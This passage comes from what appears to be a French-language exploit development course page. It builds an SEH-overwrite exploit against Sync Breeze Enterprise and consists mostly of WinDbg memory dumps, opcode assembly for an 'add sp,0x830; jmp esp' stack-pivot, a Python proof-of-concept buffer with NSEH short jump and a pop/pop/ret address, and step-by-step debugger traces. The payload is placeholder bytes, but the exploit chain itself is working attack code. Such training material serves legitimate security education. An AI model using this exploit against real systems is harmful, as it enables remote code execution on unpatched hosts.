<a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a><span class="n">019bfc70</span>  <span class="n">90909090</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-63-3" name="__codelineno-63-3" href="#__codelineno-63-3"></a><span class="n">019bfc80</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-63-4" name="__codelineno-63-4" href="#__codelineno-63-4"></a><span class="n">019bfc90</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-63-5" name="__codelineno-63-5" href="#__codelineno-63-5"></a><span class="n">019bfca0</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-63-6" name="__codelineno-63-6" href="#__codelineno-63-6"></a><span class="n">019bfcb0</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-63-7" name="__codelineno-63-7" href="#__codelineno-63-7"></a><span class="n">019bfcc0</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-63-8" name="__codelineno-63-8" href="#__codelineno-63-8"></a><span class="n">019bfcd0</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-63-9" name="__codelineno-63-9" href="#__codelineno-63-9"></a><span class="n">019bfce0</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-63-10" name="__codelineno-63-10" href="#__codelineno-63-10"></a><span class="n">019bfcf0</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-63-11" name="__codelineno-63-11" href="#__codelineno-63-11"></a><span class="n">019bfd00</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-63-12" name="__codelineno-63-12" href="#__codelineno-63-12"></a><span class="n">019bfd10</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-63-13" name="__codelineno-63-13" href="#__codelineno-63-13"></a><span class="n">019bfd20</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-63-14" name="__codelineno-63-14" href="#__codelineno-63-14"></a><span class="n">019bfd30</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-63-15" name="__codelineno-63-15" href="#__codelineno-63-15"></a><span class="n">019bfd40</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-63-16" name="__codelineno-63-16" href="#__codelineno-63-16"></a><span class="n">019bfd50</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-63-17" name="__codelineno-63-17" href="#__codelineno-63-17"></a><span class="n">019bfd60</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-63-18" name="__codelineno-63-18" href="#__codelineno-63-18"></a><span class="n">019bfd70</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-63-19" name="__codelineno-63-19" href="#__codelineno-63-19"></a><span class="n">019bfd80</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-63-20" name="__codelineno-63-20" href="#__codelineno-63-20"></a><span class="n">019bfd90</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-63-21" name="__codelineno-63-21" href="#__codelineno-63-21"></a><span class="n">019bfda0</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-63-22" name="__codelineno-63-22" href="#__codelineno-63-22"></a><span class="n">019bfdb0</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-63-23" name="__codelineno-63-23" href="#__codelineno-63-23"></a><span class="n">019bfdc0</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-63-24" name="__codelineno-63-24" href="#__codelineno-63-24"></a><span class="n">019bfdd0</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-63-25" name="__codelineno-63-25" href="#__codelineno-63-25"></a><span class="n">019bfde0</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-63-26" name="__codelineno-63-26" href="#__codelineno-63-26"></a><span class="n">019bfdf0</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-63-27" name="__codelineno-63-27" href="#__codelineno-63-27"></a><span class="n">019bfe00</span>  <span class="n">43434343</span>
</code></pre></div>
<p>Le <em>payload</em> commence très précisément à <code>019bfc74</code>, c'est-à-dire 4 octets après <code>019bfc70</code> qui contient les <code>90909090</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">dd</span> <span class="n">019bfc74</span> <span class="n">L65</span>
<a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a><span class="n">019bfc74</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a><span class="n">019bfc84</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-64-4" name="__codelineno-64-4" href="#__codelineno-64-4"></a><span class="n">019bfc94</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-64-5" name="__codelineno-64-5" href="#__codelineno-64-5"></a><span class="p">[...]</span>
<a id="__codelineno-64-6" name="__codelineno-64-6" href="#__codelineno-64-6"></a><span class="n">019bfdf4</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-64-7" name="__codelineno-64-7" href="#__codelineno-64-7"></a><span class="n">019bfe04</span>  <span class="n">fffffffe</span>
</code></pre></div>
<p>Il faut maintenant trouver l'écart entre notre pointeur de pile (<code>ESP</code>) et le début du <em>payload</em>. On va utiliser l'espace limité qu'on a pour assembler les instructions qui vont permettre de <em>island hop</em> pour rediriger vers le <em>payload</em>.</p>
<p>On soustrait l'adresse ou commence le <em>payload</em> à celle contenue dans le pointeur de pile à ce moment-là :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="p">?</span> <span class="n">019bfc74</span> <span class="p">-</span> <span class="nv">@esp</span>
<a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a><span class="n">Evaluate</span> <span class="n">expression</span><span class="p">:</span> <span class="n">2096</span> <span class="p">=</span> <span class="n">00000830</span>
</code></pre></div>
<blockquote>
<p><strong>Note</strong> : Pour s'assurer que la différence reste stable, il faut relancer plusieurs fois l'exploit, de préférence sur des systèmes différents. Dans le cas où il y aurait des variations, il est conseillé de le préfixer par des <code>NOP</code>.</p>
</blockquote>
<p>Pour atteindre notre <em>payload</em> on va augmenter <code>ESP</code> (<em>stack pointer</em>) de <code>0x830</code> et ensuite faire <code>JMP ESP</code>. Ce <em>opcode</em> contient des <em>null byte</em> qui est un mauvais caractère :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)-[/</span><span class="n">media</span><span class="p">/</span><span class="err">…</span><span class="p">/</span><span class="n">os</span><span class="p">/</span><span class="n">exp</span><span class="p">-</span><span class="n">301-osed</span><span class="p">/</span><span class="n">cours</span><span class="p">/</span><span class="n">cours4</span><span class="p">]</span>
<a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a><span class="err">└─</span><span class="p">$</span> <span class="n">msf-nasm_shell</span>
<a id="__codelineno-66-3" name="__codelineno-66-3" href="#__codelineno-66-3"></a><span class="n">nasm</span> <span class="p">&gt;</span> <span class="n">add</span> <span class="n">esp</span><span class="p">,</span><span class="n">0x830</span>
<a id="__codelineno-66-4" name="__codelineno-66-4" href="#__codelineno-66-4"></a><span class="n">00000000</span>  <span class="n">81C430080000</span>      <span class="n">add</span> <span class="n">esp</span><span class="p">,</span><span class="n">0x830</span>
</code></pre></div>
<p>On fait l'ajout sur le registre <code>sp</code> qui correspond au 16 <em>bits</em> du bas pour contourner ce problème :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a><span class="n">nasm</span> <span class="p">&gt;</span> <span class="n">add</span> <span class="n">sp</span><span class="p">,</span><span class="n">0x830</span>
<a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a><span class="n">00000000</span>  <span class="n">6681C43008</span>        <span class="n">add</span> <span class="n">sp</span><span class="p">,</span><span class="n">0x830</span>
<a id="__codelineno-67-3" name="__codelineno-67-3" href="#__codelineno-67-3"></a><span class="n">nasm</span> <span class="p">&gt;</span> <span class="n">jmp</span> <span class="n">esp</span>
<a id="__codelineno-67-4" name="__codelineno-67-4" href="#__codelineno-67-4"></a><span class="n">00000000</span>  <span class="n">FFE4</span>              <span class="n">jmp</span> <span class="n">esp</span>
</code></pre></div>
<p>On modifie la preuve de concept en ajoutant les nouveaux <em>opcodes</em> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a><span class="ch">#!/usr/bin/python</span>
<a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<a id="__codelineno-68-3" name="__codelineno-68-3" href="#__codelineno-68-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<a id="__codelineno-68-4" name="__codelineno-68-4" href="#__codelineno-68-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span>
<a id="__codelineno-68-5" name="__codelineno-68-5" href="#__codelineno-68-5"></a>
<a id="__codelineno-68-6" name="__codelineno-68-6" href="#__codelineno-68-6"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-68-7" name="__codelineno-68-7" href="#__codelineno-68-7"></a>  <span class="n">server</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<a id="__codelineno-68-8" name="__codelineno-68-8" href="#__codelineno-68-8"></a>  <span class="n">port</span> <span class="o">=</span> <span class="mi">9121</span>
<a id="__codelineno-68-9" name="__codelineno-68-9" href="#__codelineno-68-9"></a>  <span class="n">size</span> <span class="o">=</span> <span class="mi">1000</span>
<a id="__codelineno-68-10" name="__codelineno-68-10" href="#__codelineno-68-10"></a>
<a id="__codelineno-68-11" name="__codelineno-68-11" href="#__codelineno-68-11"></a>  <span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">8</span>
<a id="__codelineno-68-12" name="__codelineno-68-12" href="#__codelineno-68-12"></a>  <span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x43</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">400</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
<a id="__codelineno-68-13" name="__codelineno-68-13" href="#__codelineno-68-13"></a>
<a id="__codelineno-68-14" name="__codelineno-68-14" href="#__codelineno-68-14"></a>  <span class="n">inputBuffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">124</span>
<a id="__codelineno-68-15" name="__codelineno-68-15" href="#__codelineno-68-15"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;L&quot;</span><span class="p">,(</span><span class="mh">0x06eb9090</span><span class="p">))</span>             <span class="c1"># (NSEH)</span>
<a id="__codelineno-68-16" name="__codelineno-68-16" href="#__codelineno-68-16"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="p">(</span><span class="mh">0x1015a2f0</span><span class="p">))</span>            <span class="c1"># (SEH)  P/P/R</span>
<a id="__codelineno-68-17" name="__codelineno-68-17" href="#__codelineno-68-17"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">2</span>
<a id="__codelineno-68-18" name="__codelineno-68-18" href="#__codelineno-68-18"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x66\x81\xc4\x30\x08</span><span class="s2">&quot;</span>             <span class="c1"># ADD SP,0x830</span>
<a id="__codelineno-68-19" name="__codelineno-68-19" href="#__codelineno-68-19"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xff\xe4</span><span class="s2">&quot;</span>                         <span class="c1"># JMP ESP</span>
<a id="__codelineno-68-20" name="__codelineno-68-20" href="#__codelineno-68-20"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
<a id="__codelineno-68-21" name="__codelineno-68-21" href="#__codelineno-68-21"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="n">shellcode</span>
<a id="__codelineno-68-22" name="__codelineno-68-22" href="#__codelineno-68-22"></a>
<a id="__codelineno-68-23" name="__codelineno-68-23" href="#__codelineno-68-23"></a>  <span class="n">header</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x75\x19\xba\xab</span><span class="s2">&quot;</span>
</code></pre></div>
<p>WinDbg suite à l'exécution de l'exploit :</p>
<ul>
<li><em>Access violation</em></li>
<li>Définition du point d'arrêt comme précédemment sur l'<em>exception_handler</em></li>
<li>Relancer l'exécution</li>
<li>Exécution de la séquence P/P/R</li>
<li>Exécution du <em>short jump</em></li>
<li>Exécution des instructions <code>NOP</code></li>
<li>Exécution des instructions permettant de combler l'écart jusqu'au <em>payload</em></li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">g</span>
<a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a><span class="p">(</span><span class="n">690</span><span class="p">.</span><span class="n">13a8</span><span class="p">):</span> <span class="n">Access</span> <span class="n">violation</span> <span class="p">-</span> <span class="n">code</span> <span class="n">c0000005</span> <span class="p">(</span><span class="n">first</span> <span class="n">chance</span><span class="p">)</span>
<a id="__codelineno-69-3" name="__codelineno-69-3" href="#__codelineno-69-3"></a><span class="n">First</span> <span class="n">chance</span> <span class="n">exceptions</span> <span class="n">are</span> <span class="n">reported</span> <span class="n">before</span> <span class="n">any</span> <span class="n">exception</span> <span class="n">handling</span><span class="p">.</span>
<a id="__codelineno-69-4" name="__codelineno-69-4" href="#__codelineno-69-4"></a><span class="n">This</span> <span class="n">exception</span> <span class="n">may</span> <span class="n">be</span> <span class="n">expected</span> <span class="n">and</span> <span class="n">handled</span><span class="p">.</span>
<a id="__codelineno-69-5" name="__codelineno-69-5" href="#__codelineno-69-5"></a><span class="p">***</span> <span class="n">WARNING</span><span class="p">:</span> <span class="n">Unable</span> <span class="n">to</span> <span class="n">verify</span> <span class="n">checksum</span> <span class="k">for</span> <span class="n">C</span><span class="p">:\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Sync</span> <span class="n">Breeze</span> <span class="n">Enterprise</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">libpal</span><span class="p">.</span><span class="n">dll</span>
<a id="__codelineno-69-6" name="__codelineno-69-6" href="#__codelineno-69-6"></a><span class="n">eax</span><span class="p">=</span><span class="n">41414141</span> <span class="n">ebx</span><span class="p">=</span><span class="n">01c9fa1c</span> <span class="n">ecx</span><span class="p">=</span><span class="n">01c9ff18</span> <span class="n">edx</span><span class="p">=</span><span class="n">01c9f9d4</span> <span class="n">esi</span><span class="p">=</span><span class="n">01c9ff18</span> <span class="n">edi</span><span class="p">=</span><span class="n">01c9fb20</span>
<a id="__codelineno-69-7" name="__codelineno-69-7" href="#__codelineno-69-7"></a><span class="n">eip</span><span class="p">=</span><span class="n">00872a9d</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c9f9a8</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c9fec8</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">ng</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-69-8" name="__codelineno-69-8" href="#__codelineno-69-8"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00010286</span>
<a id="__codelineno-69-9" name="__codelineno-69-9" href="#__codelineno-69-9"></a><span class="n">libpal</span><span class="p">!</span><span class="n">SCA_ConfigObj</span><span class="p">::</span><span class="n">Deserialize</span><span class="p">+</span><span class="n">0x1d</span><span class="p">:</span>
<a id="__codelineno-69-10" name="__codelineno-69-10" href="#__codelineno-69-10"></a><span class="n">00872a9d</span> <span class="n">ff5024</span>          <span class="n">call</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">eax</span><span class="p">+</span><span class="n">24h</span><span class="p">]</span>  <span class="n">ds</span><span class="p">:</span><span class="n">0023</span><span class="p">:</span><span class="n">41414165</span><span class="p">=????????</span>
<a id="__codelineno-69-11" name="__codelineno-69-11" href="#__codelineno-69-11"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="p">!</span><span class="n">exchain</span>
<a id="__codelineno-69-12" name="__codelineno-69-12" href="#__codelineno-69-12"></a><span class="n">01c9fe1c</span><span class="p">:</span> <span class="n">libpal</span><span class="p">!</span><span class="n">md5_starts</span><span class="p">+</span><span class="n">149fb</span> <span class="p">(</span><span class="n">008edf5b</span><span class="p">)</span>
<a id="__codelineno-69-13" name="__codelineno-69-13" href="#__codelineno-69-13"></a><span class="n">01c9ff54</span><span class="p">:</span> <span class="p">***</span> <span class="n">WARNING</span><span class="p">:</span> <span class="n">Unable</span> <span class="n">to</span> <span class="n">verify</span> <span class="n">checksum</span> <span class="k">for</span> <span class="n">C</span><span class="p">:\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Sync</span> <span class="n">Breeze</span> <span class="n">Enterprise</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">libspp</span><span class="p">.</span><span class="n">dll</span>
<a id="__codelineno-69-14" name="__codelineno-69-14" href="#__codelineno-69-14"></a><span class="n">libspp</span><span class="p">!</span><span class="n">pcre_exec</span><span class="p">+</span><span class="n">16460</span> <span class="p">(</span><span class="n">1015a2f0</span><span class="p">)</span>
<a id="__codelineno-69-15" name="__codelineno-69-15" href="#__codelineno-69-15"></a><span class="n">Invalid</span> <span class="n">exception</span> <span class="n">stack</span> <span class="n">at</span> <span class="n">06eb9090</span>
<a id="__codelineno-69-16" name="__codelineno-69-16" href="#__codelineno-69-16"></a><span class="c">#</span>
<a id="__codelineno-69-17" name="__codelineno-69-17" href="#__codelineno-69-17"></a><span class="c">#</span>
<a id="__codelineno-69-18" name="__codelineno-69-18" href="#__codelineno-69-18"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">bp</span> <span class="n">0x1015a2f0</span>
<a id="__codelineno-69-19" name="__codelineno-69-19" href="#__codelineno-69-19"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">g</span>
<a id="__codelineno-69-20" name="__codelineno-69-20" href="#__codelineno-69-20"></a><span class="n">Breakpoint</span> <span class="n">0</span> <span class="n">hit</span>
<a id="__codelineno-69-21" name="__codelineno-69-21" href="#__codelineno-69-21"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-69-22" name="__codelineno-69-22" href="#__codelineno-69-22"></a><span class="n">eip</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c9f438</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c9f458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-69-23" name="__codelineno-69-23" href="#__codelineno-69-23"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-69-24" name="__codelineno-69-24" href="#__codelineno-69-24"></a><span class="n">libspp</span><span class="p">!</span><span class="n">pcre_exec</span><span class="p">+</span><span class="n">0x16460</span><span class="p">:</span>
<a id="__codelineno-69-25" name="__codelineno-69-25" href="#__codelineno-69-25"></a><span class="n">1015a2f0</span> <span class="n">58</span>              <span class="n">pop</span>     <span class="n">eax</span>
<a id="__codelineno-69-26" name="__codelineno-69-26" href="#__codelineno-69-26"></a><span class="c">#</span>
<a id="__codelineno-69-27" name="__codelineno-69-27" href="#__codelineno-69-27"></a><span class="c"># P/P/R</span>
<a id="__codelineno-69-28" name="__codelineno-69-28" href="#__codelineno-69-28"></a><span class="c">#</span>
<a id="__codelineno-69-29" name="__codelineno-69-29" href="#__codelineno-69-29"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="nb">r</span>
<a id="__codelineno-69-30" name="__codelineno-69-30" href="#__codelineno-69-30"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-69-31" name="__codelineno-69-31" href="#__codelineno-69-31"></a><span class="n">eip</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c9f438</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c9f458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-69-32" name="__codelineno-69-32" href="#__codelineno-69-32"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-69-33" name="__codelineno-69-33" href="#__codelineno-69-33"></a><span class="n">libspp</span><span class="p">!</span><span class="n">pcre_exec</span><span class="p">+</span><span class="n">0x16460</span><span class="p">:</span>
<a id="__codelineno-69-34" name="__codelineno-69-34" href="#__codelineno-69-34"></a><span class="n">1015a2f0</span> <span class="n">58</span>              <span class="n">pop</span>     <span class="n">eax</span>
<a id="__codelineno-69-35" name="__codelineno-69-35" href="#__codelineno-69-35"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-69-36" name="__codelineno-69-36" href="#__codelineno-69-36"></a><span class="n">eax</span><span class="p">=</span><span class="n">77853b02</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-69-37" name="__codelineno-69-37" href="#__codelineno-69-37"></a><span class="n">eip</span><span class="p">=</span><span class="n">1015a2f1</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c9f43c</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c9f458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-69-38" name="__codelineno-69-38" href="#__codelineno-69-38"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-69-39" name="__codelineno-69-39" href="#__codelineno-69-39"></a><span class="n">libspp</span><span class="p">!</span><span class="n">pcre_exec</span><span class="p">+</span><span class="n">0x16461</span><span class="p">:</span>
<a id="__codelineno-69-40" name="__codelineno-69-40" href="#__codelineno-69-40"></a><span class="n">1015a2f1</span> <span class="n">5b</span>              <span class="n">pop</span>     <span class="n">ebx</span>
<a id="__codelineno-69-41" name="__codelineno-69-41" href="#__codelineno-69-41"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-69-42" name="__codelineno-69-42" href="#__codelineno-69-42"></a><span class="n">eax</span><span class="p">=</span><span class="n">77853b02</span> <span class="n">ebx</span><span class="p">=</span><span class="n">01c9f540</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-69-43" name="__codelineno-69-43" href="#__codelineno-69-43"></a><span class="n">eip</span><span class="p">=</span><span class="n">1015a2f2</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c9f440</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c9f458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
